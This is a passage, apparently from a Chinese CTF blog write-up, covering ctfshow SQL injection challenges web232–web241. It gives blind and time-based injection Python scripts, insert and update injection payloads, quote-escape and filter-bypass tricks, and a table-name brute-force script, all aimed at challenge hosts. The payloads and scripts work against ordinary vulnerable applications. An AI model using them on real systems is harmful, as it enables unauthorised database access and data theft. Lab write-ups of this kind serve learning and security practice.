class="line">        <span class="keyword">if</span> <span class="string">r"\u66f4\u65b0\u6210\u529f"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'[*] 开始盲注第&#123;&#125;位'</span>.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">"&#125;"</span>:</span><br><span class="line">                print(<span class="string">'[*] flag is &#123;&#125;'</span>.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801152819566.png" alt="image-20210801152819566"></p>
<p><strong>注意，用了第一种方法的时候不要用第二种方法，容易打乱代码条件,同样的第二种方法也就是加了个括号paylaod</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=ctfshow&amp;password=12'),username=(database())<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801151650299.png" alt="image-20210801151650299"></p>
<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><blockquote>
<ul>
<li>发现连着三题都可以用第一个盲注脚本跑出来，继续梭哈</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = "http://8feb46d5-de26-4836-807f-3d7218bcb7ae.challenge.ctf.show:<span class="number">8080</span>/api/<span class="string">"</span></span><br><span class="line"><span class="string">str = "</span><span class="number">01234567890</span>abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，<span class="string">"</span></span><br><span class="line"><span class="string">flag = ""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#password=1234567811&amp;username=ctfshow' and if(substr(database(),1,1)='c',1,0)#</span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string">#--------查表</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="string">"</span></span><br><span class="line"><span class="string">#--------查字段</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag233333'</span><span class="string">"</span></span><br><span class="line"><span class="string">#--------查flag</span></span><br><span class="line"><span class="string">sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(flagass233) <span class="keyword">from</span> flag233333<span class="string">"</span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload = "</span>ctfshow<span class="string">' and if(substr((&#123;&#125;),&#123;&#125;,1)='</span>&#123;&#125;<span class="string">',1,0)#"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#计数</span></span><br><span class="line"><span class="string">n = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1, 666):</span></span><br><span class="line"><span class="string">    for j in str:</span></span><br><span class="line"><span class="string">        params = &#123;</span></span><br><span class="line"><span class="string">            '</span>username<span class="string">' : payload.format(sql,i,j),</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">password</span><span class="string">' : "&#123;&#125;".format(i)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        res = requests.post(url = url, data = params)</span></span><br><span class="line"><span class="string">        if r"\u66f4\u65b0\u6210\u529f" in res.text:</span></span><br><span class="line"><span class="string">            flag += j</span></span><br><span class="line"><span class="string">            n += 1</span></span><br><span class="line"><span class="string">            print('</span>[*] 开始盲注第&#123;&#125;位<span class="string">'.format(n))</span></span><br><span class="line"><span class="string">            print(flag)</span></span><br><span class="line"><span class="string">            if j == "&#125;":</span></span><br><span class="line"><span class="string">                print('</span>[*] flag <span class="keyword">is</span> &#123;&#125;<span class="string">'.format(flag))</span></span><br><span class="line"><span class="string">                exit()</span></span><br><span class="line"><span class="string">            break</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><blockquote>
<ul>
<li>脚本跑不动了，过滤了单引号，这题考的是\实现单引号逃逸</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">原来的语句</span><br><span class="line"><span class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass = </span><br><span class="line"><span class="string">'&#123;$password&#125;'</span> <span class="keyword">where</span> username = <span class="string">'&#123;$username&#125;'</span>;</span><br><span class="line">加上\逃逸单引号</span><br><span class="line"><span class="keyword">update</span> ctfshow_user <span class="keyword">set</span> pass = </span><br><span class="line"><span class="string">'\'</span> <span class="keyword">where</span> username = <span class="string">'&#123;$username&#125;'</span>;</span><br><span class="line">pass里面的内容则变成' where username = </span><br><span class="line">username里面的值我们可以随意控制</span><br></pre></td></tr></table></figure></div>

<p><strong>查表payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>())<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801160115328.png" alt="image-20210801160115328"></p>
<p>查字段<strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="number">0x666C6167323361</span>)<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p>查<strong>flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(flagass23s3) <span class="keyword">from</span> flag23a)<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web235"><a href="#web235" class="headerlink" title="web235"></a>web235</h2><blockquote>
<ul>
<li>这题过滤了information，ban了or和’，我们只能去找mysql里面的可以查表的表<code>mysql.innodb_table_stats</code>但是发现找不到其他里面包含字段的表了。所以只能想到无列名注入</li>
</ul>
</blockquote>
<p>可以参考一下</p>
<p><a href="https://www.jb51.net/article/134678.htm" target="_blank" rel="noopener">概述MySQL统计信息</a><br><a href="https://zhuanlan.zhihu.com/p/98206699" target="_blank" rel="noopener">CTF|mysql之无列名注入</a></p>
<p><strong>查表</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> mysql.innodb_table_stats )<span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><strong>payload查flag</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="string">`2`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag23a1)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801164011222.png" alt="image-20210801164011222"></p>
<h2 id="web236"><a href="#web236" class="headerlink" title="web236"></a>web236</h2><blockquote>
<ul>
<li>他多过滤了一个flag，一样可以用上一个payload</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=,username=(<span class="keyword">select</span> <span class="string">`2`</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flaga)a <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>) <span class="comment">#&amp;password=\</span></span><br></pre></td></tr></table></figure></div>

<p><strong>我感觉没过滤，如果真过滤了，也可以base64转过去</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;,username&#x3D;(select to_base64(&#96;2&#96;) from (select 1,2,3 union select * from flaga)a limit 1,1) #&amp;password&#x3D;\</span><br></pre></td></tr></table></figure></div>

<h2 id="web237"><a href="#web237" class="headerlink" title="web237"></a>web237</h2><blockquote>
<ul>
<li>经典insert注入</li>
</ul>
</blockquote>
<p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()));<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag'</span>));<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span> flagass23s3 <span class="keyword">from</span> flag));<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web238"><a href="#web238" class="headerlink" title="web238"></a>web238</h2><blockquote>
<ul>
<li>过滤了空格，用括号</li>
</ul>
</blockquote>
<p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="string">`table_name`</span>))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span><span class="string">`table_schema`</span>=<span class="keyword">database</span>()))<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查字段</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="string">`column_name`</span>))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span><span class="string">`table_schema`</span>=<span class="keyword">database</span>()<span class="keyword">and</span><span class="string">`table_name`</span>=<span class="string">'flagb'</span>))<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<p>查flag</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=gylq&amp;username=gylqtest',(<span class="keyword">select</span>(flag)<span class="keyword">from</span>(flagb)))<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web239"><a href="#web239" class="headerlink" title="web239"></a>web239</h2><blockquote>
<ul>
<li>过滤了information，空格</li>
</ul>
</blockquote>
<p>查表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password&#x3D;gylq&amp;username&#x3D;gylqtest&#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)))#</span><br></pre></td></tr></table></figure></div>

<p>拼不出来flag，无列名我无能为力</p>
<p><strong>查flag，猜弱flag名称</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39;,(select&#96;flag&#96;from&#96;flagbb&#96;));#&amp;password&#x3D;1</span><br></pre></td></tr></table></figure></div>

<h2 id="web240"><a href="#web240" class="headerlink" title="web240"></a>web240</h2><blockquote>
<ul>
<li>这题明显是让我们写个爆破py，安排啊</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hint: 表名共9位，flag开头，后五位由a&#x2F;b组成，如flagabaab，全小写</span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url="http://108f39e9-3737-4b40-9285-4441a3360741.challenge.ctf.show:<span class="number">8080</span>/api/insert.php<span class="string">"</span></span><br><span class="line"><span class="string">flag="</span>flag<span class="string">"</span></span><br><span class="line"><span class="string">str="</span>ab<span class="string">"</span></span><br><span class="line"><span class="string">payload="</span>gylq<span class="string">',(select(group_concat(flag))from(&#123;&#125;)))#"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for a in str:</span></span><br><span class="line"><span class="string">    for b in str:</span></span><br><span class="line"><span class="string">        for c in str:</span></span><br><span class="line"><span class="string">            for d in str:</span></span><br><span class="line"><span class="string">                for e in str:</span></span><br><span class="line"><span class="string">                    random=flag+a+b+c+d+e</span></span><br><span class="line"><span class="string">                    data = &#123;</span></span><br><span class="line"><span class="string">                        '</span>username<span class="string">' : payload.format(random) ,</span></span><br><span class="line"><span class="string">                        '</span><span class="keyword">password</span><span class="string">' : "flag"</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                    res = requests.post(url,data)</span></span><br></pre></td></tr></table></figure></div>

<p>跑一下就可以看到结果</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210801210838287.png" alt="image-20210801210838287"></p>
<h2 id="web241"><a href="#web241" class="headerlink" title="web241"></a>web241</h2><blockquote>
<ul>
<li>一开始想快速了解直接写了个布尔盲注，想着有21条数据，直接写了个布尔盲注的代码，结果只能查出flag前几位，由于环境无法插入，所以只能查出表和字段，但是flag拿不全。</li>
</ul>
</blockquote>
<p>这是可以查表和字段的布尔盲注，不过可利用价值不高，只能查出flag一部分，可以学习，<code>注意：这个代码无法查出结果</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># -- coding:UTF-8 --</span><br><span class="line"># Author:孤桜懶契</span><br><span class="line"># Date:2021&#x2F;8&#x2F;1</span><br><span class="line"># blog: gylq.gitee.io</span><br><span class="line">import requests</span><br><span class="line">#import time</span><br><span class="line"></span><br><span class="line"># def generateNum(num):</span><br><span class="line">#     res &#x3D; &#39;true&#39;</span><br><span class="line">#     if num &#x3D;&#x3D; 1:</span><br><span class="line">#         return res</span><br><span class="line">#     else:</span><br><span class="line">#         for i in range(num-1):</span><br><span class="line">#             res +&#x3D; &quot;+true&quot;</span><br><span class="line">#         return res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;6786d08e-8031-4544-aa67-f4b3028d2c8d.challenge.ctf.show:8080&#x2F;api&#x2F;delete.php&quot;</span><br><span class="line">str &#x3D; &quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">#--------查表</span><br><span class="line">#sql&#x3D; &quot;select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()&quot;</span><br><span class="line">#--------查字段</span><br><span class="line">#sql&#x3D; &quot;select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_flagas&#39;&quot;</span><br><span class="line">#--------查flag</span><br><span class="line">#sql&#x3D; &quot;select flagasabc from ctfshow_flagas&quot;</span><br><span class="line">#*************************************************************************************************************************************************************</span><br><span class="line">payload &#x3D; &quot;&#123;&#125; and  if(substr((select group_concat(flag) from flag),&#123;&#125;,1)&#x3D;&#39;&#123;&#125;&#39;,1,0)&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#计数</span><br><span class="line">n &#x3D; 0</span><br><span class="line"></span><br><span class="line">for i in range(20, 44):</span><br><span class="line">    k&#x3D;i-19</span><br><span class="line">    for j in str:</span><br><span class="line">        params &#x3D; &#123;</span><br><span class="line">            &#39;id&#39; : payload.format(k,i,j)</span><br><span class="line">        &#125;</span><br><span class="line">        res &#x3D; requests.post(url &#x3D; url, data &#x3D; params)</span><br><span class="line">        if r&quot;\u5220\u9664\u6210\u529f&quot; in res.text:</span><br><span class="line">            flag +&#x3D; j</span><br><span class="line">            n +&#x3D; 1</span><br><span class="line">            print(&#39;[*] 开始盲注第&#123;&#125;位&#39;.format(n))</span><br><span class="line">            print(flag)</span><br><span class="line">            if j &#x3D;&#x3D; &quot;&#125;&quot;:</span><br><span class="line">                print(&#39;[*] flag is &#123;&#125;&#39;.format(flag))</span><br><span class="line">                exit()</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></div>

<p>实际去环境试了下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">delete from users where id&#x3D;sleep(0.20)</span><br><span class="line">这样是可以达到延时</span><br></pre></td></tr></table></figure></div>

<p>所以这题应该是时间盲注。好了直接上脚本</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/8/1</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"><span class="comment"># def generateNum(num):</span></span><br><span class="line"><span class="comment">#     res = 'true'</span></span><br><span class="line"><span class="comment">#     if num == 1:</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"><span class="comment">#     else:</span></span><br><span class="line"><span class="comment">#         for i in range(num-1):</span></span><br><span class="line"><span class="comment">#             res += "+true"</span></span><br><span class="line"><span class="comment">#         return res</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = "http://f0b20d14-9c8f-49ed-8808-2ebc4115c907.challenge.ctf.show:<span class="number">8080</span>/api/delete.php<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">str = "</span><span class="number">01234567890</span>abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag = ""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string">#--------查库名</span></span><br><span class="line"><span class="string">#sql="</span><span class="keyword">database</span>()<span class="string">"</span></span><br><span class="line"><span class="string">#--------查表</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()<span class="string">"</span></span><br><span class="line"><span class="string">#--------查字段</span></span><br><span class="line"><span class="string">#sql= "</span><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag'</span><span class="string">"</span></span><br><span class="line"><span class="string">#--------查flag</span></span><br><span class="line"><span class="string">sql= "</span><span class="keyword">select</span> flag <span class="keyword">from</span> flag<span class="string">"</span></span><br><span class="line"><span class="string">#*************************************************************************************************************************************************************</span></span><br><span class="line"><span class="string">payload = "</span><span class="keyword">if</span>(<span class="keyword">substr</span>((&#123;&#125;),&#123;&#125;,<span class="number">1</span>)=<span class="string">'&#123;&#125;'</span>,<span class="keyword">sleep</span>(<span class="number">0.1</span>),<span class="number">0</span>)<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#计数</span></span><br><span class="line"><span class="string">n = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(1,666):</span></span><br><span class="line"><span class="string">    for j in str:</span></span><br><span class="line"><span class="string">        data = &#123;</span></span><br><span class="line"><span class="string">            'id' : payload.format(sql,i,j)</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        start = time.time()</span></span><br><span class="line"><span class="string">        res = requests.post(url = url, data = data)</span></span><br><span class="line"><span class="string">        end = time.time()</span></span><br><span class="line"><span class="string">        if end-start &gt; 2 and end-start &lt; 3:</span></span><br><span class="line"><span class="string">            flag += j</span></span><br><span class="line"><span class="string">            n += 